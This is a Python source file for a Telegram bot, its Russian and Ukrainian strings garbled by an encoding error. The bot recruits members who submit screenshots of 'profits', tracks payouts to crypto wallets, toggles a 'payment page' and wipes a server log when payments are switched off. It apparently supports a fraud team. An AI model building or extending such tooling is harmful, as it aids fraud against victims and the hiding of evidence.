import logging
import asyncio
import sqlite3
import json
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, Router, types
from aiogram.filters import Command
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove
)
import os
import random
import string
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.lib.units import mm
from reportlab.lib.utils import ImageReader
from PIL import Image
import barcode
from barcode.writer import ImageWriter
import uuid
from aiohttp import web
from functools import wraps
import aiohttp
from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS
import requests

# --- Logging setup ---
logging.basicConfig(
    filename='main.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log_function(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        logging.info(f'start | args={args} kwargs={kwargs}')
        try:
            result = await func(*args, **kwargs)
            logging.info(f'success | result={result}')
            return result
        except Exception as e:
            logging.error(f'error | Exception: {e}', exc_info=True)
            raise
    return wrapper

bot = Bot(token=API_TOKEN)
router = Router()
dp = Dispatcher()
dp.include_router(router)

# --- –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö ---
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    status TEXT,
    last_submit TEXT,
    username TEXT UNIQUE,
    source TEXT,
    invited_by TEXT,
    experience TEXT,
    screenshots TEXT,
    form_json TEXT,
    is_admin INTEGER DEFAULT 0
)
""")
conn.commit()
# –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ–º, —á—Ç–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω –µ—Å—Ç—å
c.execute('INSERT OR IGNORE INTO users (user_id, is_admin) VALUES (?, 1)', (7973971109,))
c.execute('UPDATE users SET is_admin=1 WHERE user_id=?', (7973971109,))
conn.commit()
c.execute("""
CREATE TABLE IF NOT EXISTS event_links (
    event_code TEXT PRIMARY KEY,
    user_id INTEGER
)
""")
conn.commit()





def get_user(user_id):
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
    row = c.fetchone()
    if row:
        return {
            'user_id': row[0],
            'status': row[1],
            'last_submit': row[2],
            'username': row[3],
            'source': row[4],
            'invited_by': row[5],
            'experience': row[6],
            'screenshots': json.loads(row[7]) if row[7] else [],
            'form_json': json.loads(row[8]) if row[8] else {},
            'is_admin': row[9] or 0
        }
    return None

def save_user(user_id, status, username, source, invited_by, experience, screenshots, form_json):
    c = conn.cursor()
    now = datetime.utcnow().isoformat()
    c.execute('''INSERT OR REPLACE INTO users (user_id, status, last_submit, username, source, invited_by, experience, screenshots, form_json) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (user_id, status, now, username, source, invited_by, experience, json.dumps(screenshots), json.dumps(form_json)))
    conn.commit()

def update_user_status(user_id, status):
    c = conn.cursor()
    now = datetime.utcnow().isoformat()
    c.execute('UPDATE users SET status=?, last_submit=? WHERE user_id=?', (status, now, user_id))
    conn.commit()

def is_admin(user_id):
    db_user = get_user(user_id)
    return db_user and db_user.get('is_admin', 0) == 1

# --- In-memory —à–∞–≥–∏ –∏ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ ---
user_step = {}  # user_id: —ç—Ç–∞–ø
user_data = {}  # user_id: –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∞–Ω–∫–µ—Ç—ã –∏ –ø—Ä–æ—á–µ–µ

# --- –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã ---
source_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="–†–µ–∫–ª–∞–º–∞")], [KeyboardButton(text="–û—Ç –¥—Ä—É–≥–∞")]], resize_keyboard=True
)
skip_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å")]], resize_keyboard=True
)
main_menu_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="‚öôÔ∏è–ú–µ–Ω—é"), KeyboardButton(text="üìé–°—Å—ã–ª–∫–∏")], [KeyboardButton(text="üé´–ë–∏–ª–µ—Ç—ã")]], resize_keyboard=True
)
admin_menu_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="‚öôÔ∏è–ú–µ–Ω—é"), KeyboardButton(text="üìé–°—Å—ã–ª–∫–∏")], [KeyboardButton(text="üé´–ë–∏–ª–µ—Ç—ã")], [KeyboardButton(text="üõ†Ô∏è –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å")]], resize_keyboard=True
)
profile_inline_kb = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å/–ò–∑–º–µ–Ω–∏—Ç—å –∫–æ—à–µ–ª–µ–∫", callback_data="change_wallet")],
        [InlineKeyboardButton(text="–°–º–µ–Ω–∏—Ç—å –ø—Å–µ–≤–¥–æ–Ω–∏–º", callback_data="change_nickname")]
    ]
)
def admin_pay_kb(nickname):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="üí∏ –ù–∞—á–∏—Å–ª–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data=f"pay_add:{nickname}"),
             InlineKeyboardButton(text="‚ùå –°–Ω—è—Ç—å –±–∞–ª–∞–Ω—Å", callback_data=f"pay_sub:{nickname}")],
            [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="pay_back")]
        ]
    )
admin_panel_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="üö´ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å / —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å")],
        [KeyboardButton(text="üí∏ –ù–∞—á–∏—Å–ª–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É")],
        [KeyboardButton(text="–û—Ç–∫–ª—é—á–∏—Ç—å –ø–ª–∞—Ç–µ–∂–∫—É"), KeyboardButton(text="–í–∫–ª—é—á–∏—Ç—å –ø–ª–∞—Ç–µ–∂–∫—É")],
        [KeyboardButton(text="–ü—Ä—è–º–∞—è –æ–ø–ª–∞—Ç–∞")],
        [KeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥")]
    ],
    resize_keyboard=True
)

def ban_guard(handler):
    @wraps(handler)
    async def wrapper(message, *args, **kwargs):
        uid = message.from_user.id
        db_user = get_user(uid)
        if db_user and db_user['form_json'].get('banned', False):
            await message.answer(
                "–í–∏ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º. –ü—Ä–∏—á–∏–Ω–∞: " + db_user['form_json'].get('ban_reason', '–ù–µ –≤–∫–∞–∑–∞–Ω–∞')
            )
            return
        return await handler(message, *args, **kwargs)
    return wrapper

# --- –ê–Ω–∫–µ—Ç–∞ ---
@router.message(Command("start"))
@ban_guard
async def cmd_start(message: types.Message):
    uid = message.from_user.id
    db_user = get_user(uid)
    if db_user:
        if db_user['status'] == 'pending':
            await message.answer("–í–∞—à–∞ –∑–∞—è–≤–∫–∞ —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞, –æ–∂–∏–¥–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫–∏.")
            return
        elif db_user['status'] == 'approved':
            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
            await message.answer("–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ–¥–æ–±—Ä–µ–Ω–∞!\n–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–µ–Ω—é –Ω–∏–∂–µ:", reply_markup=kb)
            return
        elif db_user['status'] == 'rejected':
            if db_user['last_submit']:
                last = datetime.fromisoformat(db_user['last_submit'])
                if datetime.utcnow() - last < timedelta(days=7):
                    next_time = last + timedelta(days=7)
                    await message.answer(f"–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞. –ü–æ–≤—Ç–æ—Ä–Ω–æ –ø–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É –º–æ–∂–Ω–æ {next_time.strftime('%d.%m.%Y %H:%M')}")
                    return
    user_data[uid] = {}
    user_step[uid] = 'source'
    await message.answer("üì¢ –û—Ç–∫—É–¥–∞ –æ –Ω–∞—Å —É–∑–Ω–∞–ª–∏?", reply_markup=source_kb)

@router.message(lambda m: m.text and (m.text.lower() == '–æ—Ç–º–µ–Ω–∞' or m.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'))
@ban_guard
async def cancel_any_action(message: types.Message):
    uid = message.from_user.id
    user_step[uid] = None
    user_data[uid] = {}
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)

@router.message(lambda m: user_step.get(m.from_user.id) == 'source')
@ban_guard
async def process_source(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    if message.text not in ["–†–µ–∫–ª–∞–º–∞", "–û—Ç –¥—Ä—É–≥–∞"]:
        await message.answer("üì¢ –û—Ç–∫—É–¥–∞ –æ –Ω–∞—Å —É–∑–Ω–∞–ª–∏?", reply_markup=source_kb)
        return
    user_data[uid]['source'] = message.text
    if message.text == "–û—Ç –¥—Ä—É–≥–∞":
        user_step[uid] = 'invited_by'
        await message.answer("üë§ –ö—Ç–æ –ø—Ä–∏–≥–ª–∞—Å–∏–ª? (tag –∏–ª–∏ username)", reply_markup=ReplyKeyboardRemove())
    else:
        user_step[uid] = 'experience'
        await message.answer("üíº –£–∫–∞–∂–∏—Ç–µ –æ–ø—ã—Ç —Ä–∞–±–æ—Ç—ã\n‚è∞ –°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –≥–æ—Ç–æ–≤—ã —É–¥–µ–ª—è—Ç—å?", reply_markup=ReplyKeyboardRemove())

@router.message(lambda m: user_step.get(m.from_user.id) == 'invited_by')
@ban_guard
async def process_invited_by(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    user_data[uid]['invited_by'] = message.text
    user_step[uid] = 'experience'
    await message.answer("üíº –£–∫–∞–∂–∏—Ç–µ –æ–ø—ã—Ç —Ä–∞–±–æ—Ç—ã\n‚è∞ –°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –≥–æ—Ç–æ–≤—ã —É–¥–µ–ª—è—Ç—å?", reply_markup=ReplyKeyboardRemove())

@router.message(lambda m: user_step.get(m.from_user.id) == 'experience')
@ban_guard
async def process_experience(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    user_data[uid]['experience'] = message.text
    user_data[uid]['screenshots'] = []
    user_step[uid] = 'screenshots'
    await message.answer("üñº –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç—ã –≤–∞—à–∏—Ö –ø—Ä–æ—Ñ–∏—Ç–æ–≤ (–¥–æ 3—Ö)\n–ú–æ–∂–Ω–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å", reply_markup=skip_kb)

@router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots' and m.text and m.text.strip().lower() == "–ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å")
@ban_guard
async def skip_screenshots(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    if 'screenshots' not in user_data[uid]:
        user_data[uid]['screenshots'] = []
    await finish_form(message)
    return

@router.message(lambda m: m.content_type == types.ContentType.PHOTO)
@ban_guard
async def process_screenshots(message: types.Message):
    uid = message.from_user.id
    if user_step.get(uid) != 'screenshots':
        return
    user_data[uid]['screenshots'].append(message.photo[-1].file_id)
    if len(user_data[uid]['screenshots']) >= 3:
        await finish_form(message)
    else:
        await message.answer(f"–°–∫—Ä–∏–Ω—à–æ—Ç {len(user_data[uid]['screenshots'])} –ø—Ä–∏–Ω—è—Ç. –ú–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –µ—â–µ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å'.", reply_markup=skip_kb)

@router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots')
@ban_guard
async def process_other(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    # –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–∞—Ç–∏—Å–Ω—É–≤ "–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å" (–±—É–¥—å-—è–∫–∏–π —Ä–µ–≥—ñ—Å—Ç—Ä/–ø—Ä–æ–±—ñ–ª–∏), –Ω–µ –æ–±—Ä–æ–±–ª—è—î–º–æ —Ç—É—Ç
    if message.text and message.text.strip().lower() == "–ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å":
        return
    await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç(—ã) –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å'.", reply_markup=skip_kb)

async def finish_form(message):
    uid = message.from_user.id
    username = message.from_user.username or "-"
    data = user_data[uid]
    text = f"–ù–æ–≤–∞—è –∞–Ω–∫–µ—Ç–∞!\n\nID: <code>{uid}</code>\nUsername: @{username}\n–ò—Å—Ç–æ—á–Ω–∏–∫: {data.get('source')}\n"
    if data.get('source') == "–û—Ç –¥—Ä—É–≥–∞":
        text += f"–ö—Ç–æ –ø—Ä–∏–≥–ª–∞—Å–∏–ª: {data.get('invited_by')}\n"
    text += f"–û–ø—ã—Ç: {data.get('experience')}\n"
    if data['screenshots']:
        text += f"–°–∫—Ä–∏–Ω—à–æ—Ç—ã: {len(data['screenshots'])} —à—Ç.\n"
    else:
        text += f"–°–∫—Ä–∏–Ω—à–æ—Ç—ã: –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã\n"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text="–ü—Ä–∏–Ω—è—Ç—å", callback_data=f"approve_{uid}"),
            InlineKeyboardButton(text="–û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"reject_{uid}")
        ]]
    )
    await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
    for ph in data['screenshots']:
        await bot.send_photo(ADMIN_GROUP_ID, ph)
    await message.answer("–í–∞—à–∞ –∞–Ω–∫–µ—Ç–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–µ–π!\n–û–∂–∏–¥–∞–π—Ç–µ —Ä–µ—à–µ–Ω–∏–µ", reply_markup=ReplyKeyboardRemove())
    save_user(uid, 'pending', username, data.get('source'), data.get('invited_by'), data.get('experience'), data.get('screenshots', []), data)
    user_step[uid] = None

@router.callback_query(lambda c: c.data.startswith('approve_') or c.data.startswith('reject_'))
async def process_decision(call: types.CallbackQuery):
    action, uid = call.data.split('_')
    uid = int(uid)
    if action == 'approve':
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        welcome_text = (
            "–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ–¥–æ–±—Ä–µ–Ω–∞!\n"
            "–ß–∞—Ç: https://t.me/+hzNJ46_Vrc4wMzVk \n"
            "–ö–∞–Ω–∞–ª –æ–ø–ª–∞—Ç: https://t.me/+qAiX41DRpeA5MDc8 \n"
            "–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã –≤–≤–µ–¥–∏—Ç–µ /start"
        )
        await bot.send_message(uid, welcome_text, reply_markup=kb)
        update_user_status(uid, 'approved')
    else:
        await bot.send_message(uid, "–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.")
        update_user_status(uid, 'rejected')
    user_step.pop(uid, None)
    user_data.pop(uid, None)
    await call.message.edit_reply_markup(reply_markup=None)
    await call.answer()

# --- –ú–µ–Ω—é –∏ –ø—Ä–æ—Ñ–∏–ª—å ---
@router.message(lambda m: m.text == "‚öôÔ∏è–ú–µ–Ω—é")
@ban_guard
async def show_profile(message: types.Message):
    uid = message.from_user.id
    db_user = get_user(uid)
    nickname = db_user['username'] or db_user['form_json'].get('username') or f"{uid}"
    join_date = db_user['last_submit'][:10] if db_user and db_user['last_submit'] else "-"
    if join_date != "-":
        join_date = datetime.fromisoformat(db_user['last_submit']).strftime('%d-%m-%Y')
    earned_total = db_user['form_json'].get('earned_total', 0) if db_user else 0
    earned_june = db_user['form_json'].get('earned_june', 0) if db_user else 0
    wallet = db_user['form_json'].get('wallet', None) if db_user else None
    wallet_str = wallet if wallet else '<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b> <b>‚ùóÔ∏è</b>'
    text = (
        '¬´<b>–í–∞—à –ø—Ä–æ—Ñ–∏–ª—å:</b>¬ª\n'
        f'<b>–ü—Å–µ–≤–¥–æ–Ω–∏–º:</b> <code>#{nickname}</code>\n'
        f'<b>–î–∞—Ç–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏—è:</b> <code>{join_date}</code>\n'
        'üí∞ <b>–ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ:</b>\n'
        f'‚îú <b>–í—Å–µ–≥–æ:</b> <code>{earned_total}$</code>\n'
        f'‚îî <b>–ó–∞ –∏—é–Ω—å:</b> <code>{earned_june}$</code>\n'
        'üí≥ <b>USDT BEP-20 –∫–æ—à–µ–ª–µ–∫:</b>\n'
        f'‚îî {wallet_str}'
    )
    await message.answer(text, reply_markup=profile_inline_kb, parse_mode='HTML')
    user_step[uid] = None

@router.callback_query(lambda c: c.data == "change_nickname")
async def change_nickname_start(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'change_nickname'
    await call.message.answer("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø—Å–µ–≤–¥–æ–Ω–∏–º:")
    await call.answer()

@router.message(lambda m: user_step.get(m.from_user.id) == 'change_nickname')
@ban_guard
async def change_nickname_save(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    new_nick = message.text.strip()
    c = conn.cursor()
    c.execute('SELECT user_id FROM users WHERE username=?', (new_nick,))
    row = c.fetchone()
    if row and row[0] != uid:
        await message.answer("–î–∞–Ω–Ω—ã–π –ø—Å–µ–≤–¥–æ–Ω–∏–º —É–∂–µ –∑–∞–Ω—è—Ç, –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π.")
        return
    c.execute('UPDATE users SET username=? WHERE user_id=?', (new_nick, uid))
    db_user = get_user(uid)
    form_json = db_user['form_json'] if db_user else {}
    form_json['username'] = new_nick
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), uid))
    conn.commit()
    user_step[uid] = None
    await message.answer(f"–ü—Å–µ–≤–¥–æ–Ω–∏–º –∏–∑–º–µ–Ω—ë–Ω –Ω–∞: <b>{new_nick}</b>", parse_mode='HTML', reply_markup=main_menu_kb)

@router.callback_query(lambda c: c.data == "change_wallet")
async def change_wallet_start(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'change_wallet'
    await call.message.answer("–í–≤–µ–¥–∏—Ç–µ –≤–∞—à USDT BEP-20 –∫–æ—à–µ–ª–µ–∫:")
    await call.answer()

@router.message(lambda m: user_step.get(m.from_user.id) == 'change_wallet')
@ban_guard
async def change_wallet_save(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    new_wallet = message.text.strip()
    db_user = get_user(uid)
    form_json = db_user['form_json'] if db_user else {}
    form_json['wallet'] = new_wallet
    c = conn.cursor()
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), uid))
    conn.commit()
    user_step[uid] = None
    await message.answer(f"–ö–æ—à–µ–ª–µ–∫ —Å–æ—Ö—Ä–∞–Ω—ë–Ω: <code>{new_wallet}</code>", parse_mode='HTML', reply_markup=main_menu_kb)

# --- –ê–¥–º–∏–Ω–∫–∞ ---
@router.message(lambda m: m.text == "üõ†Ô∏è –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å" and is_admin(m.from_user.id))
@ban_guard
async def admin_panel(message: types.Message):
    await message.answer("–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å. –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=admin_panel_kb)
    user_step[message.from_user.id] = 'admin_panel'

@router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel')
@ban_guard
@log_function
async def admin_panel_action(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    if message.text == "‚¨ÖÔ∏è –ù–∞–∑–∞–¥":
        kb = admin_menu_kb
        await message.answer("–í–æ–∑–≤—Ä–∞—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.", reply_markup=kb)
        user_step[uid] = None
        return
    elif message.text == "üö´ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å / —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å":
        user_step[uid] = 'ban_unban_user'
        await message.answer("–í–≤–µ–¥–∏—Ç–µ username –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏/—Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ (–±–µ–∑ @):", reply_markup=ReplyKeyboardRemove())
    elif message.text == "üí∏ –ù–∞—á–∏—Å–ª–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É":
        user_step[uid] = 'pay_user'
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="payuser_back")]
            ]
        )
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –ø—Å–µ–≤–¥–æ–Ω–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb)
    elif message.text == "–û—Ç–∫–ª—é—á–∏—Ç—å –ø–ª–∞—Ç–µ–∂–∫—É":
        # –í–∏–º–∫–Ω—É—Ç–∏ –ø–ª–∞—Ç—ñ–∂–∫—É —á–µ—Ä–µ–∑ —Å–µ—Ä–≤–µ—Ä
        import requests
        try:
            requests.get('http://127.0.0.1:8080/set_payment_disabled?value=1', timeout=2)
            # –û—á–∏—â–µ–Ω–Ω—è server.log
            with open('server.log', 'w') as f:
                f.truncate(0)
        except Exception as e:
            print(f"[admin_panel] Error disabling payment: {e}")
        await message.answer("–ü–ª–∞—Ç—ñ–∂–∫–∞ —Ç–∏–º—á–∞—Å–æ–≤–æ –≤—ñ–¥–∫–ª—é—á–µ–Ω–∞ –¥–ª—è –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.")
    elif message.text == "–í–∫–ª—é—á–∏—Ç—å –ø–ª–∞—Ç–µ–∂–∫—É":
        # –£–≤—ñ–º–∫–Ω—É—Ç–∏ –ø–ª–∞—Ç—ñ–∂–∫—É —á–µ—Ä–µ–∑ —Å–µ—Ä–≤–µ—Ä
        import requests
        try:
            requests.get('http://127.0.0.1:8080/set_payment_disabled?value=0', timeout=2)
        except Exception as e:
            print(f"[admin_panel] Error enabling payment: {e}")
        await message.answer("–ü–ª–∞—Ç–µ–∂–∫–∞ –≤–∫–ª—é—á–µ–Ω–∞ –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
    elif message.text == "–ü—Ä—è–º–∞—è –æ–ø–ª–∞—Ç–∞":
        # –¢—É—Ç –ª–æ–≥—ñ–∫–∞ –¥–ª—è –ø—Ä—è–º–æ—ó –æ–ø–ª–∞—Ç–∏
        await message.answer("–í–∫–ª—é—á–µ–Ω–æ —Ä–µ–∂–∏–º –ø—Ä—è–º–æ—ó –æ–ø–ª–∞—Ç–∏. –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º.")
    else:
        await message.answer("–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞.")

@router.callback_query(lambda c: c.data == "payuser_back")
async def payuser_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'admin_panel'
